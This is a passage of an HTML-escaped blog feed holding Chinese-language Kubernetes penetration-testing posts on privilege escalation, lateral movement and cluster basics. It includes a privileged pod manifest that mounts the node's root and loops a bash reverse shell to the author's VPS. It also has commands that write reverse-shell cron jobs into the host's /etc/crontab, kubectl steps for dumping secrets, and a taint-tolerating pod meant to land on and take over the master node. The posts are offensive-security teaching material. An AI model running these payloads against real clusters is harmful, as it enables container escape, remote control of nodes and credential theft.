style=&#34;color:#f92672&#34;&gt;labels&lt;/span&gt;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;app&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;test-rev&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;spec&lt;/span&gt;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;nodeName&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;&amp;lt;节点名称&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;containers&lt;/span&gt;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      - &lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;test-container&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;image&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;ubuntu&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;command&lt;/span&gt;: [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin/sh&amp;#34;&lt;/span&gt;]&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;args&lt;/span&gt;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-c&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          - |&lt;span style=&#34;color:#e6db74&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;            apt update &amp;amp;&amp;amp; apt install -y bash netcat-openbsd &amp;amp;&amp;amp; \&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;            bash -c &amp;#39;while true; do bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;你的vps的公网IP&amp;gt;/2333 0&amp;gt;&amp;amp;1; sleep 60; done&amp;#39;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;volumeMounts&lt;/span&gt;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        - &lt;span style=&#34;color:#f92672&#34;&gt;mountPath&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;/mnt&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          &lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;test-volume&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;securityContext&lt;/span&gt;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          &lt;span style=&#34;color:#f92672&#34;&gt;privileged&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;volumes&lt;/span&gt;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      - &lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;test-volume&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;hostPath&lt;/span&gt;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          &lt;span style=&#34;color:#f92672&#34;&gt;path&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;/&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;指定yaml文件即可创建：&lt;/p&gt;</description>
    </item>
    <item>
      <title>K8s渗透-权限提升</title>
      <link>http://localhost:1313/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%B8%97%E9%80%8F-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</link>
      <pubDate>Wed, 01 Jan 2025 00:00:00 +0800</pubDate>
      <guid>http://localhost:1313/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%B8%97%E9%80%8F-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</guid>
      <description>&lt;h1 id=&#34;k8s渗透-权限提升&#34;&gt;K8s渗透-权限提升&lt;/h1&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;文章首发于track安全社区：&lt;a href=&#34;https://bbs.zkaq.cn/t/32483.html&#34;&gt;K8s渗透入门从零到一&lt;/a&gt;&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;一般来说，在k8s中的提权就是尝试从pod容器获取到对node节点的控制权，甚至获取对云资源的访问权限。&lt;/p&gt;&#xA;&lt;h2 id=&#34;rbac权限滥用&#34;&gt;RBAC权限滥用&lt;/h2&gt;&#xA;&lt;p&gt;类似于我们在执行中提到的打法，就是获取pod中高权限（比如绑定到cluster-admin用户组）的serviceaccount，然后再调用apiserver实现逃逸，然而除了cluster-admin，很多凭证也是可以权限提升到cluster-admin的，我们可以重点关注Helm、Cilium、Nginx Ingress、Prometheus等服务&lt;/p&gt;&#xA;&lt;h2 id=&#34;部署静态pod&#34;&gt;部署静态pod&lt;/h2&gt;&#xA;&lt;p&gt;这个方法在我的&lt;a href=&#34;https://www.cnblogs.com/yuy0ung/articles/19076992&#34;&gt;k8s渗透-持久化&lt;/a&gt;的笔记中已经介绍过了，这里不再赘述&lt;/p&gt;&#xA;&lt;h2 id=&#34;利用容器不安全配置提权&#34;&gt;利用容器不安全配置提权&lt;/h2&gt;&#xA;&lt;p&gt;即容器逃逸，这里的很多tricks其实和docker逃逸没有很大区别&lt;/p&gt;&#xA;&lt;h3 id=&#34;挂载目录逃逸&#34;&gt;挂载目录逃逸&lt;/h3&gt;&#xA;&lt;p&gt;挂载的方法很多，例如挂载根目录、挂载pocfs、挂载/etc、挂载cgroup、挂载/var/log等等，可以直接看我的这篇文章：&lt;a href=&#34;https://www.cnblogs.com/yuy0ung/articles/18819294&#34;&gt;Docker逃逸手法大全&lt;/a&gt;，这里提一个最简单的挂载根目录：&lt;/p&gt;&#xA;&lt;p&gt;比如我们创建恶意pod的时候，根目录挂载到了容器的&lt;code&gt;/mnt&lt;/code&gt;目录，所以在获取了pod的shell后，我们可以通过查看pod的&lt;code&gt;/mnt&lt;/code&gt;目录来访问查看node的根目录：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752337790318-20250714003958889.png&#34; alt=&#34;QQ_1752337790318&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;接下来可以通过写定时任务来获取node的shell：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo -e &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;* * * * * root /bin/bash -c &amp;#39;sh -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;vps的公网IP&amp;gt;/4444 0&amp;gt;&amp;amp;1 &amp;amp; disown  &amp;#39;&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /mnt/etc/crontab&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;&#xA;&lt;p&gt;注意，这里并没有直接使用&lt;code&gt;sh -i &amp;gt; /dev/tcp/&amp;lt;IP&amp;gt;/4444 2&amp;gt;&amp;amp;1&lt;/code&gt;，因为cron 默认使用的是 /bin/sh，而不是 bash，sh 不支持&lt;code&gt;&amp;gt;&amp;amp;&lt;/code&gt;语法，上面的yaml文件中反弹shell的payload同理&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;我在k3s环境遇到一个问题，在收到反弹shell后会立刻自动exit或者退出：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752384892469.png&#34; alt=&#34;QQ_1752384892469&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;这里其实可以偷懒直接chroot一下也行，但是这样只能以高权限进行文件相关操作：&#xA;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752342324537-20250714004016922.png&#34; alt=&#34;QQ_1752342324537&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;不过通过查阅资料发现原因可能和busybox的情况类似，对&lt;code&gt;-i&lt;/code&gt;即交互参数支持不完整，那么我们可以尝试使用&lt;code&gt;disown&lt;/code&gt;命令让我们反弹shell的进程不受父shell进程影响而exit：&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;echo -e &amp;#34;* * * * * root /bin/bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;IP&amp;gt;/4444 0&amp;gt;&amp;amp;1 &amp;amp; disown&amp;#39;&amp;#34; &amp;gt;&amp;gt; /mnt/etc/crontab&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752384977729.png&#34; alt=&#34;QQ_1752384977729&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;此时我们就可以接收到反弹的shell并且不会断开了：&#xA;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752344803661-20250714004017953.png&#34; alt=&#34;QQ_1752344803661&#34;&gt;&lt;/p&gt;&#xA;&lt;h3 id=&#34;持久化挂载dockersock&#34;&gt;持久化挂载docker.sock&lt;/h3&gt;&#xA;&lt;p&gt;挂载docker socket逃逸同样在我写的 &lt;a href=&#34;https://www.cnblogs.com/yuy0ung/articles/18819294&#34;&gt;Docker逃逸手法大全&lt;/a&gt; 中详细介绍了，值得一提的是，如果已经获取了此类容器的 full tty shell, 可以用类似下述的命令创建一个通往宿主机的 shell：&lt;/p&gt;</description>
    </item>
    <item>
      <title>k8s渗透-横向移动</title>
      <link>http://localhost:1313/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%B8%97%E9%80%8F-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</link>
      <pubDate>Wed, 01 Jan 2025 00:00:00 +0800</pubDate>
      <guid>http://localhost:1313/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%B8%97%E9%80%8F-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</guid>
      <description>&lt;h1 id=&#34;k8s渗透-横向移动&#34;&gt;k8s渗透-横向移动&lt;/h1&gt;&#xA;&lt;h2 id=&#34;窃取凭证&#34;&gt;窃取凭证&lt;/h2&gt;&#xA;&lt;h3 id=&#34;kubeconfig凭证&#34;&gt;kubeconfig凭证&lt;/h3&gt;&#xA;&lt;p&gt;kubeconfig文件通常出现在运维PC、内网跳板机、堡垒机、master节点等机器上，kubeconfig文件的使用在我的 &lt;a href=&#34;https://www.cnblogs.com/yuy0ung/articles/19031290&#34;&gt;k8s渗透-初始访问&lt;/a&gt; 笔记中已经介绍了，这里不再说明&lt;/p&gt;&#xA;&lt;h3 id=&#34;secret对象&#34;&gt;secret对象&lt;/h3&gt;&#xA;&lt;p&gt;在k8s中，secret对象用于存储密码、OAuth令牌、ssh密钥等敏感信息，我们可以尝试从中窃取其他服务的通信凭证：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubeconfig get secrets -A&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1757151099118.png&#34; alt=&#34;QQ_1757151099118&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;查看指定secret内容：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl --kubeconfig config -n &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;指定命名空间&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; get secret &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;secret名称&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; -o yaml&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1757151463832.png&#34; alt=&#34;QQ_1757151463832&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;可惜这里案例上是hash，如果是硬编码在secret中，就可以解码获取明文密码了&lt;/p&gt;&#xA;&lt;h2 id=&#34;集群内网渗透&#34;&gt;集群内网渗透&lt;/h2&gt;&#xA;&lt;p&gt;K8s默认允许集群内部的pod和service直接通信，在没有NetworkPolicy / eBPF限制的情况下，无论是node还是pod，内网的通信和常规内网渗透的情况基本无差异，我们仍然可以使用nmap、masscan、fscan等扫描工具进行内网探索，也可以使用常规内网的横向移动手段&lt;/p&gt;&#xA;&lt;h2 id=&#34;第三方组件风险&#34;&gt;第三方组件风险&lt;/h2&gt;&#xA;&lt;p&gt;在很多k8s的配置教程中会存在一些忽略真实环境安全问题的情况，导致一些插件/服务存在未授权的情况，甚至是服务账号具有高权限，基于这些情况，我们可以关注一些常见的服务账号比如helm、cilium、Nginx Ingress、Prometheus，比如helm v2版本默认存在高权限账号，那么可以利用高权限给自己赋予cluster-admin进而提权逃逸&lt;/p&gt;&#xA;&lt;p&gt;简而言之，我们的思路可以是：进入pod，通过漏洞/未授权攻击第三方组件，利用组件的不当权限操作k8s集群&lt;/p&gt;&#xA;&lt;h2 id=&#34;污点taint横向&#34;&gt;污点（taint）横向&lt;/h2&gt;&#xA;&lt;p&gt;这个方法较为鸡肋，原因是k8s污点横向需要配合一些漏洞，而这些配合漏洞往往可以单独拿到权限&lt;/p&gt;&#xA;&lt;p&gt;污点是k8s高级调度的特性，用于限制哪些pod能被调度到某一节点上&lt;/p&gt;&#xA;&lt;p&gt;其中污点有三种属性(效果)：&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;NoSchedule&lt;/strong&gt;：这是最常见的类型，表示不允许 Pod 被自动调度到带有此污点的节点上。只有当 Pod 具有与污点匹配的容忍度时，才能在这些节点上调度 Pod。&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;PreferNoSchedule&lt;/strong&gt;：这种类型表示不推荐但允许 Pod 被调度到带有此污点的节点上。即使节点上设置了 &lt;code&gt;PreferNoSchedule&lt;/code&gt; 污点，如果没有其他更适合的节点，Pod 仍然可以被调度到这些节点上。&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;NoExecute&lt;/strong&gt;：这种类型表示节点上的Pod会被驱逐（Eviction），即使它们已经运行在该节点上。通常，&lt;code&gt;NoExecute&lt;/code&gt; 污点会导致 Pod 被终止并迁移到其他节点。&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;一般来说master节点包含一个污点，而这个污点通常用于阻止pod调度到主节点上，除非pod能容忍该污点（通常容忍这个污点的pod都是系统级，别比如kube-system命名空间下的pod），在普通节点横向时，我们可以使用污点容忍度创建恶意pod尝试横向到主节点&lt;/p&gt;&#xA;&lt;p&gt;比如：获取worker节点权限，创建配置了与master节点污点对应容忍度的恶意node，yaml如下：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cat &amp;gt; x.yaml &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;lt;&amp;lt; EOF&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;apiVersion: v1&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;kind: Pod&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;metadata:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  name: control-master-x&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;spec:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  tolerations:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  - key: &amp;#34;node-role.kubernetes.io/master&amp;#34;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    operator: &amp;#34;Exists&amp;#34;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    effect: &amp;#34;NoSchedule&amp;#34;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  containers:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  - name: control-master-x&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    image: ubuntu:18.04&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    command: [&amp;#34;/bin/sleep&amp;#34;, &amp;#34;3650d&amp;#34;]&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    volumeMounts:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    - name: master&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;      mountPath: /master&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  volumes:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  - name: master&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    hostPath:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;      path: /&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;      type: Directory&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;EOF&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这样create的pod允许被调度到主节点，这里多次尝试创建就有机会创建到master节点，进而逃逸接管master节点&lt;/p&gt;</description>
    </item>
    <item>
      <title>K8s渗透入门从零到一</title>
      <link>http://localhost:1313/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%B8%97%E9%80%8F%E5%85%A5%E9%97%A8%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80/</link>
      <pubDate>Wed, 01 Jan 2025 00:00:00 +0800</pubDate>
      <guid>http://localhost:1313/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%B8%97%E9%80%8F%E5%85%A5%E9%97%A8%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80/</guid>
      <description>&lt;h1 id=&#34;k8s渗透从0到1&#34;&gt;K8s渗透从0到1&lt;/h1&gt;&#xA;&lt;p&gt;文章首发于track安全社区：&lt;a href=&#34;https://bbs.zkaq.cn/t/32483.html&#34;&gt;K8s渗透入门从零到一&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h2 id=&#34;k8s基础&#34;&gt;k8s基础&lt;/h2&gt;&#xA;&lt;h3 id=&#34;k8s架构&#34;&gt;k8s架构&lt;/h3&gt;&#xA;&lt;p&gt;Kubernetes 又称 k8s，是 Google 在 2014 年开源的一个用来管理容器的平台&lt;/p&gt;&#xA;&lt;p&gt;k8s基本架构如下（图片的scheduler打错了，特此更正）：&#xA;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752397186606.png&#34; alt=&#34;QQ_1752397186606&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;从上图来看可以知道，k8s主要由较少的master节点和其对应的多个Node节点组成，master节点对node及诶单进行管理控制，一个K8s集群至少要有一台master节点&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;master节点&lt;/strong&gt;主要有以下核心组件：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;etcd 保存了整个集群的状态&lt;/li&gt;&#xA;&lt;li&gt;API Server 提供了资源操作的唯一入口，并提供认证、授权、访问控制、API 注册和发现等机制&lt;/li&gt;&#xA;&lt;li&gt;Controller Manager 负责维护集群的状态，比如故障检测、自动扩展、滚动更新等&lt;/li&gt;&#xA;&lt;li&gt;Scheduler 负责资源的调度，按照预定的调度策略将 Pod 调度到相应的机器上&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;node节点&lt;/strong&gt;有以下核心组件：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Kubelet 负责维护容器的生命周期，同时也负责Volume（CVI）和网络（CNI）的管理，每个node节点中都存在一份&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Container Runtime 负责镜像管理以及 Pod 和容器的真正运行（CRI），早期是docker引擎作为组件，从v1.20开始使用 containerd、CRI-O 等&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Kube-proxy 负责为 Service 提供 Cluster 内部的服务发现和负载均衡&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;pod 是k8s中的最小调度单位，pod内部就是容器，k8s通过操作pod来控制容器，一个node下面可以有多个pod&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;fluentd不是 Kubernetes 的核心组件，但常用于日志收集，将 Pod 的 stdout/stderr 日志采集到集中系统（如 Elasticsearch、Kafka）中。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Pod可以说是Node节点中最核心的部分，Pod也是一个容器，它是一个”用来封装容器的容器”。一个Pod中往往会装载多个容器，这些容器共用一个虚拟环境，共享着网络和存储等资源&lt;/p&gt;&#xA;&lt;p&gt;这些容器的资源共享以及相互交互都是由pod里面的pause容器来完成的，每初始化一个pod时便会生成一个pause容器&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250713220938432.png&#34; alt=&#34;image-20250713220938432&#34;&gt;&lt;/p&gt;&#xA;&lt;h3 id=&#34;k8s特点&#34;&gt;k8s特点&lt;/h3&gt;&#xA;&lt;p&gt;和docker相比，docker更偏向于单机管理，而k8s则是偏向于多机集群管理，由于容器的寿命比较短暂，需要经常调试环境，而重新打包部署容器比较麻烦，又会存在一系列问题，包括但不限于网络，数据同步等，因此才有了K8S来对容器进行部署和管理&lt;/p&gt;&#xA;&lt;p&gt;k8s具有如下的特点：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;自我修复：对容器进行监测，出现问题就在原有无问题容器基础上进行复制启动，出现问题的容器进行抛弃或重启&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;弹性伸缩：容器数量的控制&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;自动部署和回滚：通过配置文件进行自动的容器构建，对容器的回滚更新&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;服务发现和负载均衡：默认方案&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;机密和配置管理：对敏感数据或其他进行配置管理&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;存储编排：虚拟磁盘与物理磁盘&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;批处理：批量任务实现&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;k8s工作流程&#34;&gt;k8s工作流程&lt;/h3&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;kubectl 是 k8s 的客户端工具，可以使用命令行管理集群&lt;/p&gt;</description>
    </item>
    <item>
      <title>Kubernetes安全基础</title>
